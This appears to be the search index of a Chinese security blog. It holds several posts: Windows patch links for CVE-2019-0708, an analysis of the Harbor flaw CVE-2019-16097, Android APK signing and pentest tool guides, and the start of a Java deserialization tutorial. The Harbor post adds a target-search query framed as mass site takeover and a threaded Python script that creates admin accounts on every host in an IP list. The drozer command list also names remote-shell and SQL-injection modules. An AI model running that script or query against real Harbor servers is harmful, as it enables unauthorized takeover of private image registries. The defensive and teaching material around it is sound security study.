http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu Windows Server 2008 x64位系统: http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu Windows Server 2008 R2 Itanium系统: http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu Windows Server 2008 R2 x64系统: http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu Windows Server 2008 Itanium: http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu 2.Windows Server 2003 漏洞补丁系列下载地址Windows Server 2003 32位系统: http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe Windows Server 2003 64位系统: http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe 3.Windows XP 漏洞补丁系列下载地址Windows XP SP3 32位系统: http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe Windows XP SP2 64位系统: http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe Windows XP SP3 for XPe: http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe 参考：https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961","link":"/2019/10/13/web%E6%B8%97%E9%80%8F/CVE/CVE-2019-0708/"},{"title":"CVE-2019-16097 Harbor权限提升漏洞分析","text":"Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。 Unit 42安全研究人员Aviv Sasson在Harbor中发现了一个严重漏洞，攻击者利用该漏洞可以通过发送恶意请求来控制Harbor注册表。Unit 42研究人员发现有超过1300个使用有漏洞的默认配置的Harbor Registry服务器可以通过互联网访问。 背景研究人员在Harbor项目中发现了一个重要的权限提升漏洞，攻击者利用该漏洞可以在默认配置下获取admin权限。该漏洞于9月10日公布，CVE编号为 CVE-2019-16097。 Harbor项目在过去4年内的知名度和流行度不断攀升，并于去年11月成为CNCF incubating project （CNCF孵化项目）。Harbor项目的赞助商和使用企业包括： 图1. Harbor项目的赞助商和使用企业 漏洞影响该漏洞的影响非常严重，因为在获取admin权限后，可以初始化许多攻击向量。攻击者可以下载和查看所有的私有项目，可以删除registry上的镜像，甚至可以替换镜像来污染registry。攻击者可以创建新的用户，并将它设置为admin。之后，攻击者可以通过Docker命令行工具用新的凭证连接Harbor registry，并替换当前的镜像。恶意镜像可以说恶意软件、加密货币挖矿机等。 POC视频如下： https://www.biantube.com/watch/LBgIKqdfF1k 漏洞分析首先分析User结构： 图2. Harbor源代码中的User结构 研究人员关注的目标参数是HasAdminRole，该参数的目的是表明用户是否admin。如果可以修改为True，攻击的目的就达到了。 那么如何实现呢？首先分析API调用，如果有人尝试访问/api/users，那么就会发现一些有趣的调用： 图3. /api/users 如果用户想要发送POST请求，就可以到达负责新用户注册的代码段。 图4. POST请求处理逻辑 漏洞位于user.go:317中： 1if err := ua.DecodeJSONReq(&amp;user); err != nil 在该行代码中，我们可以从POST请求中获取数据，然后解码为用户对象。 正常的请求payload如下所示： 1{“username”:”test”,”email”:”test123@gmai.com”,”realname”:”no name”,”password”:”Password1\\u0021″,”comment”:null} 问题在于攻击者可以发送一个请求，并加入参数has_admin_role。如果发送“had_admin_role” = “True”的请求，就可以创建为admin的用户。 漏洞利用研究人员写了一个简单的python脚本，用来发送POST请求到/api/users来创建权限为admin的新用户，需要在request body中将参数has_admin_role设置为True。运行脚本后，唯一需要做的是在浏览器中打开Harbor，并用新创建的用户登入。 0x01使用关键词批量拿站title=”Harbor” &amp;&amp; country=CN 0x02 复现点击注册、然后抓取数据包 数据包后面加上一段：”has_admin_role”:true 查看响应包、201 表示成功了 登录账号验证一下 0x03批量脚本12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport jsonimport csvfrom concurrent.futures import ThreadPoolExecutordef exp(url): url = url + '/api/users' headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Content-Type': 'application/json', } payload = { &quot;username&quot;: &quot;test1&quot;, &quot;email&quot;: &quot;test1@qq.com&quot;, &quot;realname&quot;: &quot;test1&quot;, &quot;password&quot;: &quot;Aa123456&quot;, &quot;comment&quot;: &quot;test1&quot;, &quot;has_admin_role&quot;: True } payload = json.dumps(payload) try: requests.packages.urllib3.disable_warnings() r = requests.post(url, headers=headers, data=payload, timeout=2, verify=False) if r.status_code == 201: print(url) except Exception as e: passif __name__ == '__main__': data = open('ip.txt') # 批量IP reader = csv.reader(data) # 50是线程 with ThreadPoolExecutor(50) as pool: for row in reader: if 'http' not in row[0]: url = 'http://' + row[0] else: url = row[0] pool.submit(exp, url) 成功之后、就会打印出URL、然后根据上方的账号和密码就可以直接登录了 解决方案Harbor团队发布了解决该漏洞的补丁，9月18日发布的Harbor versions 1.7.6和1.8.3版本中都进行了安全更新。发布注释中说是通过禁止注册时创建admin用户来解决该问题。 开发者加入了一个检查过程来防止非管理员用户创建新的admin用户。该漏洞存在于1.70-1.8.2版本中，因此研究人员建议用户尽快更新到最新版本。 利用方式转载自T9Sec","link":"/2019/10/16/web%E6%B8%97%E9%80%8F/CVE/CVE-2019-16097-Harbor%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Andoird签名文件META-INF详解","text":"在Android的apk包中含有一个叫做META-INF的文件夹，这个里边存储的是关于签名的一些信息。 其中将apk包解压出来，进入META-INF目录，发现会有3个文件：CERT.RSA，CERT.SF，MANIFEST.MF。 MAINFEST.MF用记事本打开MANIFEST.MF文件，这是个可读的文本文件，大约内容如下： 12345678Manifest-Version: 1.0Created-By: 1.0 (Android)Name: res/drawable-hdpi/shop_search_bg.pngSHA1-Digest: OgQ5gmKTFoxuZWAaKBBJKl1Oy24=Name: res/drawable/merchant_btn_selector.xmlSHA1-Digest: AkxLT25+wtnL6DCN10rcSTpz6kM= 版本号以及对每一个文件的哈希值（BASE64）。包括资源文件。这个是对每个文件的整体进行SHA1 hash （1）MANIFEST.MF：这是摘要文件。程序遍历Apk包中的所有文件(entry)，对非文件夹非签名文件的文件，逐个用SHA1生成摘要信息，再用Base64进行编码。如果你改变了apk包中的文件，那么在apk安装校验时，改变后的文件摘要信息与MANIFEST.MF的检验信息不同，于是程序就不能成功安装。 说明：如果攻击者修改了程序的内容，有重新生成了新的摘要，那么就可以通过验证，所以这是一个非常简单的验证。 看到跟manifest.mf中的很类似，也是BASE64编码的哈希值，这个是对每个文件的头3行进行SHA1 hash。这两个文件中的内容仅仅是个摘要，也就是仅仅对文件做个hash。 CERT.SF然后是CERT.SF文件，用记事本打开，内容如下： 1234567891011Signature-Version: 1.0Created-By: 1.0 (Android)SHA1-Digest-Manifest: I2tqVFgbG+PZh6o8SWuDePSrTcQ=Name: res/drawable-hdpi/shop_search_bg.pngSHA1-Digest: twMIUeZAdwmMBjIDlo/5EiSFWj0=Name: res/drawable/merchant_btn_selector.xmlSHA1-Digest: GJqtJ+iUO4Xrjgzri8nzR+GDLVU= （2）CERT.SF：这是对摘要的签名文件。对前一步生成的MANIFEST.MF，使用SHA1-RSA算法，用开发者的私钥进行签名。在安装时只能使用公钥才能解密它。解密之后，将它与未加密的摘要信息（即，MANIFEST.MF文件）进行对比，如果相符，则表明内容没有被异常修改。 说明：在这一步，即使开发者修改了程序内容，并生成了新的摘要文件，但是攻击者没有开发者的私钥，所以不能生成正确的签名文件（CERT.SF）。系统在对程序进行验证的时候，用开发者公钥对不正确的签名文件进行解密，得到的结果和摘要文件（MANIFEST.MF）对应不起来，所以不能通过检验，不能成功安装文件。 CERT.RSA最后一个文件是CERT.RSA，这个文件中放的是apk包的签名，同时还有证书的公钥。 一般来说，证书的内容是：开发者信息+开发者公钥 +CA的签名（ CA对前两部分做hash值然后私钥加密之后的密文） 验证过程是：用CA公钥对括号里的内容解密，然后对前两部分hash，跟CA的签名进行对比，看是否相同。 暂时不知道Android中既然已经有了对整个文件的摘要，为什么还要弄个前3行的摘要。 （3）CERT.RSA文件中保存了公钥、所采用的加密算法等信息。 说明：系统对签名文件进行解密，所需要的公钥就是从这个文件里取出来的。 结论：从上面的总结可以看出，META-INFO里面的说那个文件环环相扣，从而保证Android程序的安全性。（只是防止开发者的程序不被攻击者修改，如果开发者的公私钥对对攻击者得到或者开发者开发出攻击程序，Android系统都无法检测出来。） 猜想： cert.rsa这个文件中应该存放的是开发者信息+开发者公钥+开发者签名【自己就是CA】（对前两部分的hash用自己私钥做加密）， 解密过程应该是：首先提取自己公钥，然后对自己加密的那部分解密，然后对前2部分做hash进行比对，模拟跟验证证书。然后再用公钥依次验证每一个文件的摘要看是否正确。","link":"/2020/05/10/web%E6%B8%97%E9%80%8F/Android/Andoird%E7%AD%BE%E5%90%8D%E6%96%87%E4%BB%B6META-INF%E8%AF%A6%E8%A7%A3/"},{"title":"Android生成keystore证书给apk签名","text":"keytool生成keystore在cmd命令行模式下进入JDK的bin目录(如已设置环境变量可在随意目录) 执行命令：keytool -genkey -alias antma -keyalg RSA -validity 40000 -keystore antma.keystore注：-alias antma –表示别名 ​ -keyalg RSA –产生键的加密算法 -validity 40000 --有效期限4000天 执行完成后，当前目录就会生成antma.keystore 文件 如需查看：keytool -list -keystore “antma.keystore” jarsigner签名及解决找不到证书链的问题jarsigner -verbose -keystore antma.keys -signedjar 签名后的apk名称 需签名apk keystore中的别名（不是文件名） 注：上面的keystore中的别名，一定记住不是文件名，如果写文件名就会提示 jarsigner: 找不到 xxx 的证书链。xxx 必须引用包含私有密钥和相应的公共密钥证书链的有效密钥库密钥条目。","link":"/2020/05/10/web%E6%B8%97%E9%80%8F/Android/Android%E7%94%9F%E6%88%90keystore%E8%AF%81%E4%B9%A6%E7%BB%99apk%E7%AD%BE%E5%90%8D/"},{"title":"Android渗透测试基础及工具","text":"Android 架构Android 是基于 Linux 平台的操作系统。Android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，Android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和Linux内核层。 Android使用Dalvik虚拟机的概念，可以高效的运行多个虚拟机。Android操作系统使用这些虚拟机将各个应用程序运行为自己的进程。 安装的应用程序会因各种目的保存到如下目录： 123456/system/app/应用名.apk // 保存系统应用程序/data/app/应用名.apk // 保存已注册的用户应用程序/data/app/应用名-1.apk // 保存用户下载的应用程序/mnt/secure/asec/应用名-1.asec // 保存移动到SD卡的应用程序/data/data/应用名 // 保存应用程序的重要信息/mnt/sdcard // 保存应用程序的一般信息 其中/data/data/应用名保存的信息最为重要： 123456/data/data/应用名├─files // 保存内部使用的文件（so、data、ini文件等）├─lib // 保存应用程序请求的库文件（存在so文件）├─databases // 保存设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）├─cache // 有读写权限，包括浏览器缓存和用户临时状态信息└─shared_prefs // 保存为XML文件，是应用程序共享的设置文件 其中 shared_prefs 目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时，此处会包含API密钥的盗用、认证密钥值等信息。 Android 重要组件以及生命周期Android 由Activity，Service（服务）,Content Provider（内容提供者），BroadCastReceiver（广播接收器）四大基本组件组成。 ActivityAndroid 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity的生命周期如下图所示： 途中涉及到的各类方法： ServiceService 不会显示给用户，其运行过程与Activity相似。听音乐或者录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。 Activity与Service都以名为UI线程的相同应用线程执行。 Content ProviderContent Provider 是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete）原则。应用程序通过Inter共享小数据。Content Provider 适合共享音乐文件、图片文件等大容量文件。 BroadCastReceiver你的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager 来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。 四大组件的注册四大基本组件都需要注册才能使用，每个Activity、service、Content Provider内容提供者都需要在AndroidManifest文件中进行配置，AndroidManifest文件中未进行声明的activity、服务以及内容提供者将不为系统所见，从而也就不可用，而BroadcastReceive广播接收者的注册分静态注册（在AndroidManifest文件中进行配置）和通过代码动态创建并以调用Context.registerReceiver()的方式注册至系统。需要注意的是在AndroidManifest文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态,只要接收到感兴趣的广播就会触发（即使程序未运行）。 AndroidManifest文件中进行注册格式如下： 1234&lt;activity&gt; 元素的name 属性指定了实现了这个activity 的Activity 的子类。icon 和label 属性指向了包含展示给用户的此activity 的图标和标签的资源文件。&lt;service&gt; 元素用于声明服务&lt;receiver&gt; 元素用于声明广播接收器&lt;provider&gt; 元素用于声明内容提供者 APKAPK 文件其实是一个 Zip 的压缩包，解压了此文件可以看到如下目录： 12345678910APK├─META-INF // 主要存放证书，没有证书无法安装程序 │ ├─CERT.RSA // 公钥证书│ ├─CERT.SF // 包含APP的所用资源，负责对APP进行签名│ └─MANIFEST.MF // 声明了资源，与CERT.SF相似├─res // 存放资源文件的目录├─lib // 如果存在的话，存放的是 ndk 编出来的 so 库├─resources.arsc // 编译后的二进制资源文件├─classes.dex // 最终生成的 dalvik 字节码└─AndroidManifest.xml // 程序全局配置文件 classes.dexDex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。 classes.dex 文件头的格式如下： androidManifest.xmlandroidManifest.xml 是每个Android程序中必须的文件，它位于整个项目的根目录。我们每天都在使用这个文件，往里面配置程序运行所必要的组件，权限，以及一些相关信息。 AndroidManifest.xml是Android应用的入口文件，它描述了package中暴露的组件（activities, services, 等等），他们各自的实现类，各种能被处理的数据和启动位置。 除了能声明程序中的Activities, ContentProviders, Services, 和Intent Receivers,还能指定permissions和instrumentation（安全控制和测试）。 常用工具ADBadb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。 借助adb工具，可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作 命令介绍123456789101112131415161718192021222324252627282930313233343536# 查看设备$ adb devices# 连接设备（夜神模拟器端口 62001）$ adb connect ip:port # 安装软件$ adb install [apk文件路径]# 卸载软件$ adb uninstall [软件名]$ adb uninstall -k [软件名] // 如果加 -k 参数,为卸载软件但是保留配置和缓存文件.# 进入设备或模拟器的shell$ adb shell# 运行单条命令$ adb shell [command]# 端口转发$ adb forward [PC] [设备]$ adb forward tcp:6100 tcp:7100 // PC上所有6100端口通信数据将被重定向到手机端7100端口server上$ adb forward tcp:6100 local:logd // PC上所有6100端口通信数据将被重定向到手机端UNIX类型socket上$ adb forward tcp:62002 jdwp:17304 //在本地62002端口被重定向到手机17304进程上# 从电脑上发送文件到设备$ adb push [本地路径] [远程路径]# 从设备上下载文件到电脑$ adb pull [远程路径] [本地路径]# 查看bug报告$ adb bugreport# 查看log$ adb logcat drozerDrozer原名mercury,是一款不错的Android APP安全评估工具。现在有社区版/专业版两个版本。 安装安装其实比较简单，这里不进行描述，只是记录下安装过程中遇到的问题以及解决方案。 一、修复连接时java路径找不到问题 解决方案： 1、创建如下文件并命名为：1.txt （如果为winXP，则可以直接命名为.drozer_config）2、写入内容如下几行内容：此处为java.exe文件的安装位置，具体情况具体处理。 123[executables]java =C:\\rogram Files\\Java\\jdk1.7.0_40\\bin\\java.exejavac =C:\\Program Files\\Java\\jdk1.7.0_04\\bin\\javac.exe 3、把此文件放入个人目录下文件夹： 12英文：C:\\Users\\&lt;youruser name&gt;\\中文：C:\\用户\\&lt;你的用户名名称&gt;\\ 4、通过cmd命令重命名此文件为：.drozer_config 1rename C:\\Users\\d00218136\\1.txt .drozer_config 运行12$ adb connect 127.0.0.1:62001 // 连接设备$ adb forward tcp:31415 tcp:31415 // 开启端口转发 开启移动设备中的agent.apk 1$ drozer console connect 用法1234567# 列出设备中安装的包$ run app.package.list$ run app.package.list -f 【app名称】 // 搜索包# 获取安装的包的信息$ run app.package.info$ run app.package.info -a com.zjhcsoft.android.eip // 列举指定包的信息$ run app.package.info -p android.permission.INTERNET // 根据权限来列举包 123# 列举设备上所有的activity$ run app.activity.info$ run app.activity.info -f 【包名】 搜索包的activity 1234567891011121314151617181920# 列举设备上所有的provider$ run app.provider.info# 列举设备上所有的service$ run app.service.info# 列举设备上所有的broadcast$ run app.broadcast.info# 查看某包的受攻击面$ run app.package.attacksurface com.zjhcsoft.android.eip# 运行activity$ run app.activity.info -a 【包】 $ run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】$ run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity# 根据指定的intent action和intent category来查看activity$ run app.activity.forintent --action 【intent action】 --category 【intent category】$ run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT 其他用法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指$ run 令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准jav// a的.class文件，它体积小，运行效率高。$ run app.activity.forintent // Find activities that can handle the given intent $ run app.activity.info // Gets information about exported activities. $ run app.activity.start // Start an Activity $ run app.broadcast.info // Get information about broadcast receivers $ run app.broadcast.send // Send broadcast using an intent $ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents $ run app.package.attacksurface // Get attack surface of package $ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) $ run app.package.debuggable // Find debuggable packages $ run app.package.info // Get information about installed packages $ run app.package.launchintent // Get launch intent of package $ run app.package.list // List Packages $ run app.package.manifest // Get AndroidManifest.xml of package $ run app.package.native // Find Native libraries embedded in the application. $ run app.package.shareduid // Look for packages with shared UIDs $ run app.provider.columns // List columns in content provider $ run app.provider.delete // Delete from a content provider $ run app.provider.download // Download a file from a content provider that supports files $ run app.provider.finduri // Find referenced content URIs in a package $ run app.provider.info // Get information about exported content providers $ run app.provider.insert // Insert into a Content Provider $ run app.provider.query // Query a content provider $ run app.provider.read // Read from a content provider that supports files $ run app.provider.update // Update a record in a content provider $ run app.service.info // Get information about exported services $ run app.service.send // Send a Message to a service, and display the reply $ run app.service.start // Start Service $ run app.service.stop // Stop Service $ run auxiliary.webcontentresolver // Start a web service interface to content providers. $ run exploit.jdwp.check // Open @jdwp-control and see which apps connect $ run exploit.pilfer.general.apnprovider // Reads APN content provider $ run exploit.pilfer.general.settingsprovider // Reads Settings content provider $ run information.datetime // Print Date/Time $ run information.deviceinfo // Get verbose device information $ run information.permissions // Get a list of all permissions used by packages on the device $ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser $ run scanner.misc.native // Find native components included in packages $ run scanner.misc.readablefiles // Find world-readable files in the given folder $ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer $ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system). $ run scanner.misc.writablefiles // Find world-writable files in the given folder $ run scanner.provider.finduris // Search for content providers that can be queried from our context. $ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities. $ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities. $ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities. $ run shell.exec // Execute a single Linux command. $ run shell.send // Send an ASH shell to a remote listener. $ run shell.start // Enter into an interactive Linux shell. $ run tools.file.download // Download a File $ run tools.file.md5sum // Get md5 Checksum of file $ run tools.file.size // Get size of file $ run tools.file.upload // Upload a File $ run tools.setup.busybox // Install Busybox. $ run tools.setup.minimalsu // Prepare 'minimal-su' binary installation on the device. androguardandroguard (Android guard) 是 Android 应用程序的逆向工程，提供恶意软件分析等等功能，androguard 主要由 Python 编写。 androguard 主要有以下功能： 1234567androrisk.py // 该模块用于分析apk危险级别androapkinfo.py // 该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息androaxml.py // 该模块用于展示apk androidmanifest.xmlandrogexf.py // 该模块生成函数调用图apkviewer.py // 该模块生成指令级别的调用图androlyze.py // 该模块为交互分析环境androdiff.py // 分析2个apk的不同之处,检测app是否遭到修改 androapkinfo.py该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息 1$ python androapkinfo.py -i app-release.apk androlyze.py该模块为交互分析环境 1$ python androlyze.py -i app-release.apk -x 123$ python androlyze.py -s$ a,d,dx = AnalyzeAPK(&quot;Desktop/app-release.apk&quot;)$ print a,d,dx 12$ d,dx = AnalyzeDex(&quot;Desktop/classes.dex&quot;)$ print d,dx 等等，可以使用tab键 androdd.py查看apk文件结构 按照指定格式显示androidapk的所有类和子方法的信息流 1$ python androdd.py -i app-release.apk -o out -f png androgexf.pyandrogexf.py 将方法信息之间的连接状态转换成gexf格式 1$ androgexf.py -i app-release.apk -o apk.gexf androdiff.pyandrodiff.py 分析2个apk的不同之处,检测app是否遭到修改 1$ python androdiff.py -i app-release1.apk app-release2.apk 工具集一、santoku 操作系统santoku 实质是一款定制的 Ubuntu 12.04 系统镜像，类似于KALI，与其它Ubuntu系统相比，它具有如下特点： 1.集成了大量主流的Android程序分析工具，为分析人员节省分析环境配置所需的时间。2.集成移动设备取证工具。支持Android、IPhone 等移动设备的取证工作。3.集成渗透测试工具。4.集成网络数据分析工具。在分析 Android病毒、木马等程序时，这些工具特别有用。5.采用 LXDE 作为系统的桌面环境，界面与 Windows XP非常相似，符合中国人使用习惯。6.正处于beta 阶段，但整个项目显得很有活力，相信将来的更新和维护也会不错。 二、APKIDEAPKIDE这是一个大佬们集成的一个APK的测试工具集，包含了常用的大部分工具，例如adb、apktool等。 基础操作签名前面介绍过，META-INF这个文件主要与签名、证书有关。 对APP进行签名一、删除apk中的META-INF文件夹，然后重新zip压缩成apk二、创建密钥存储器（已经有的可以跳过） 1$ keytool -genkey -v -keystore 【keystore名称】 -alias 【密钥别名】 -keyalg RSA -keysize 2048 -validity 【有效天数】 三、使用密钥存储器对app进行签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 签名成功后会重新出现META-INF文件夹 查看APP的签名解压APK文件，使用JDK的keytool来查看META-INF/CERT.RSA文件内容 1$ keytool -printcert -file 【证书】 验证APP的签名1$ jarsigner -verify -verbose 【apk存放路径】 查看AndroidManifest.xml文件1$ java -jar apktool.jar d -f s 【APK地址】 静态调试一、将apk文件转化为jar文件 1$ dex-jar.bat 【apk】 二、jd-gui.exe 可反编译jar文件 动态调试一、将apk转换成smali代码 1$ java -jar apktool.jar d 【APK地址】 -o out 二、修改AndroidManifest.xml中的Android:debuggable=”true” 三、在入口处添加waitForDebugger代码进行调试等待 这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static {}, Landroid/os/Debug;-&gt;waitForDebugger()V // 相当于java的 android.os.Debug.waitForDebugger(); 四、将smali 转换成apk 1$ java -jar apktool.jar b 【路径】 【目标路径】 五、重新签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 六、安装apk 1$ adb install 【apk】 七、android studio 导入此项目，需要配置gradle，可参考文章 路径一般为 home\\.gradle\\wrapper\\dists\\gradle-x.x-all\\xxxxxxxxxxxxx\\gradle-x.x 八、配置android studio调试配置，Run-&gt;Edit configurations，点击+号，新建remote类型调试器，设置Name， 修改端口号，可以选择被占用的任意端口，本次设置为62002 九、运行指定的Activity 1$ adb shell am start -D -n com.zjhcsoft.android.eip/.MainActivity 十、查找相应的apk进程 1$ adb shell ps | findstr eip 十一、设置端口转发 1$ adb forward tcp:62002 jdwp:17304 这条命令的含义可以认为是在本地62002端口与手机17304进程之间建立一条通道，当开始调试时，AS连接本地的8800端口，通过这条通道控制程序的运行 十二、设置断点 十三、调试 run-&gt;debug选择刚才新增的调试器，此时程序会断在设置的断点的行，调试器解密如下 渗透测试中注意的点废话不说，直接上图好了。 转自：http://blog.orleven.com/2017/06/22/android-base/","link":"/2020/09/15/Android%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%B7%A5%E5%85%B7/"},{"title":"JAVA反序列化漏洞入门","text":"前言学习本系列文章需要的Java基础： 了解Java基础语法及结构（菜鸟教程） 了解Java面向对象编程思想（快速理解请上知乎读故事，深入钻研建议买本《疯狂Java讲义》另外有一个刘意老师的教学视频也可以了解一下，其中关于面向对象思想的介绍比较详细。链接：https://pan.baidu.com/s/1kUGb3D1#list/path=%2F&amp;parentPath=%2FJava%E7%B1%BB 密码：kk0x） 基本的Eclipse使用（自行百度） 其实只要大学上过Java课，或者自学过一小段时间都OK。如果没有的话，可以括号里的资源资源在短时间内掌握。 本教程的目的： 掌握反序列化漏洞原理。 在实战中能发现和利用反序列化漏洞。 掌握合理规避反序列化漏洞的编程技巧。 序列化与反序列化基础什么是序列化和反序列化Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。 一个类的对象要想序列化成功，必须满足两个条件： 该类必须实现 java.io.Serializable 接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。 下面书写一个简单的demo，为了节省文章篇幅，这里把序列化操作和反序列化操作弄得简单一些，并省去了传递过程，对象所属类： 12345678910111213141516171819/** * Description: * &lt;br/&gt;网站: &lt;a href=&quot;http://ph0rse.me&quot;&gt;Ph0rse's Blog&lt;/a&gt; * &lt;br/&gt;Copyright (C), 2018-2020, Ph0rse * &lt;br/&gt;This program is protected by copyright laws. * &lt;br/&gt;Program Name: * &lt;br/&gt;Date: * @author Ph0rse prudenidealist@outlook.com * @version 1.0 */public class Employee implements java.io.Serializable{ public String name; public String identify; public void mailCheck() { System.out.println(&quot;This is the &quot;+this.identify+&quot; of our company&quot;); }} 将对象序列化为二进制文件： 1234567891011121314151617181920212223242526//反序列化所需类在io包中import java.io.*;public class SerializeDemo{ public static void main(String [] args) { Employee e = new Employee(); e.name = &quot;员工甲&quot;; e.identify = &quot;General staff&quot;; try { // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(&quot;D:\\\\Task\\\\employee1.db&quot;); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(e); out.close(); fileOut.close(); System.out.printf(&quot;Serialized data is saved in D:\\\\Task\\\\employee1.db&quot;); }catch(IOException i) { i.printStackTrace(); } }} 一个Identity属性为Visitors的对象被储存进了employee1.db，而反序列化操作就是从二进制文件中提取对象： 1234567891011121314151617181920212223242526272829import java.io.*;public class SerializeDemo{ public static void main(String [] args) { Employee e = null; try { // 打开一个文件输入流 FileInputStream fileIn = new FileInputStream(&quot;D:\\\\Task\\\\employee1.db&quot;); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 e = (Employee) in.readObject(); in.close(); fileIn.close(); }catch(IOException i) { i.printStackTrace(); return; }catch(ClassNotFoundException c) { System.out.println(&quot;Employee class not found&quot;); 